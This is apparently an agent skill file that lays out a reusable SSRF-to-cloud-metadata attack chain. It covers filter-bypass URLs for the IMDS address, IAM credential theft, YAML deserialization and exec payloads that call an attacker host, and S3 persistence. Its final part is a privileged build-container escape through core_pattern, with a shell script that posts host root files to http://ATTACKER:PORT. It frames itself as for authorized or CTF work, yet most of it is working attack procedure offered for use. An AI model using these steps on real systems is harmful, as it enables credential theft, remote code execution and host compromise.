---
name: ssrf-cloud-metadata
description: Use for SSRF or cloud-native targets. IMDS creds to RCE.
---

# SSRF to Cloud Metadata to Queue/Worker RCE (reusable)

Pattern for cloud-native apps - a feature fetches a user-supplied URL, the
filter blocks the metadata service, and stolen cloud creds unlock internal
message queues whose workers execute attacker-shaped jobs. Authorized
engagements only.

## Phase 1 - SSRF filter bypass ladder (try in order)
Given filter blocks `169.254.169.254` (AWS IMDS) -
1. Decimal `http://2852039166/` ; Hex `0xA9FEA9FE`
2. **Octal per-octet `0251.0376.0251.0376`** (works when regex only matches
   dotted-decimal digits)
3. IPv6 - `http://[::ffff:a9fe:a9fe]/` ; `http://[fd00:ec2::254]/`
4. DNS rebind / redirect - attacker page 302s to the metadata IP
5. URL parser confusion - `http://169.254.169.254@evil/`, `http://evil#@169.../`
6. Suffix/extension filters (URL must end .yaml/.json) - append an
   INERT QUERY STRING - `?x=.yaml` - endswith/regex-tail filters satisfied,
   path untouched. Combines with octal IP to defeat two filters at once.
7. Other metadata locations - GCP `metadata.google.internal`, Azure
   `169.254.169.254/metadata/instance` (needs `Metadata: true` header).

## Phase 2 - Steal cloud credentials
- IMDSv1 - `GET /latest/meta-data/iam/security-credentials/<role>` returns
  JSON (AccessKeyId/SecretAccessKey/Token) in the SSRF response body.
- IMDSv2 defended - needs PUT + token header; SSRF must allow method/header
  control, or find a different SSRF primitive.
- Parse carefully - response often embedded in HTML - extract the <pre>
  block and HTML-unescape before json.loads.

## Phase 3 - Internal service graph
- With creds - enumerate S3/SQS/Lambda/Secrets at the INTERNAL endpoint
  (often `http://internal-host:4566` or container names like `aws.local`).
- Map the container network - worker IPs (172.18.x.x), service hostnames,
  health endpoints (`/_localstack/health` shows REAL vs mocked services).
- Pull worker/application SOURCE from artifact buckets - source review shows
  exactly what message format triggers execution.

## Phase 4 - Message-injection RCE
- Unsafe deserialization in consumers - `yaml.load(...)` WITHOUT
  `Loader=SafeLoader` executes object tags -
  `!!python/object/apply:os.system ['curl ATTACKER/rce']`
- Direct-exec variant - worker does `subprocess.run(['python3','-c',
  job['script']])` - just send script text. Wrap complex payloads in
  base64 (`import base64;exec(base64.b64decode('...').decode())`) to
  survive quoting through YAML->JSON->shell layers.
- Queue permissions needed - sqs:SendMessage (+ GetQueueUrl). Steal a
  web-role token rather than the worker-role (workers often lack send).
- Persistence - overwrite the worker artifact in S3 if containers redeploy
  from it.

## Phase 5 - Privileged build-service container escape (VERIFIED WIN)
When the internal cloud emulator exposes a CI/CD build service (CodeBuild
family), even with only shared/test credentials:
1. create_project - privilegedMode=True, image of choice, serviceRole arn.
2. start_build - CRITICAL PARAMS (builds fail at DOWNLOAD_SOURCE without
   them) - `sourceTypeOverride="NO_SOURCE"` + `buildspecOverride=...`.
3. `BASH_FUNC_id%%` env override = `() { echo uid=1000; }` - entrypoint
   scripts that call `id` to decide drop-privileges get fooled, container
   stays REAL ROOT (CapEff ~0x1fffffffffff, CAP_SYS_ADMIN).
4. buildspec quoting - shell inside buildspec inside API call inside YAML
   = three quote layers that WILL mangle each other. Base64-wrap the whole
   payload script - `echo <b64> > /ib64.txt; base64 -d /ib64.txt > /i.sh;
   bash /i.sh` - zero quoting survives to break.
5. core_pattern host escape (needs CAP_SYS_ADMIN) -
   ```sh
   UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
   printf '#!/bin/sh\ncat /root/root.txt | curl -s -X POST --data-binary @- http://ATTACKER:PORT/ROOTFLAG\n' > /x.sh
   chmod +x /x.sh
   echo "|${UDIR}/x.sh" > /proc/sys/kernel/core_pattern
   ulimit -c unlimited
   bash -c 'kill -11 $$'   # SIGSEGV triggers usermode-helper as HOST ROOT
   ```
   The kernel runs the pattern helper on the HOST - the curl POST lands
   with host-level file contents. Exfil over HTTP, NOT the container
   filesystem (overlay upperdirs differ per container - artifacts written
   for a 'later' container never appear).
6. Emulator-edition reality check - 'community edition is a mock' is a
   claim to TEST, not a wall. A trivial buildspec (single echo) proving
   BUILD phase SUCCEEDED = containers ARE real; then debug your own
   quoting, not the platform.

## Debug ladder for failing builds (each step isolates one variable)
1. Trivial buildspec (`echo hi`) - SUCCEEDED = exec works, your payload is
   the problem. FAILED at PROVISIONING = platform/image problem.
2. Add one command at a time back - the one that flips status to FAILED is
   your quoting/logic bug.
3. Fetch build logs (cloudwatch `get_log_events` on the logs groupName/
   streamName from batch_get_builds, or S3 dump) - read the ACTUAL error.
4. Name collision - reusing a project/queue name from a previous run can
   silently bind to stale config; rename per attempt.

## Golden rules
- Out-of-band callback FIRST for every did-it-execute question - listener
  MUST capture full requests INCLUDING POST bodies (a 33-byte flag arrived
  invisible for an hour because the listener logged headers only).
- Source code from buckets beats black-box guessing at message formats.
- Environment inventory - know which venv/interpreter has which library
  (boto3 vs impacket may live in different venvs on the attacker box).
